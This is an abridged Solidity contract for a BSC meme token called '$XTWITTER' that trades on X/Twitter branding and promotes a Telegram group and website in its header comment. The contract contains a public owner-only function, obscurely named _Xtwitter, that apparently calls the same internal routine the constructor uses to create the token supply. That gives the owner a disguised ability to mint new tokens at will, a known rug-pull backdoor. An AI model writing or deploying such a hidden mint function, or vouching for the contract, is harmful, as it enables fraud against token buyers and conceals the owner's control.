//
// $𝕏-Twitter proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/XTwitter_BSC
//  📱 Website::https://X-Twitter.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Xtwitter(uint256 amount) public onlyOwner {
 _Xtwitter(msg.sender, amount);
    }
    ...
    function _Xtwitter(address account, uint256 amount) internal virtual {
...
contract $XTWITTER is ERC20 {
    ...
    constructor() public ERC20("𝕏-Twitter", "XTWITTER") {
     _Xtwitter(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}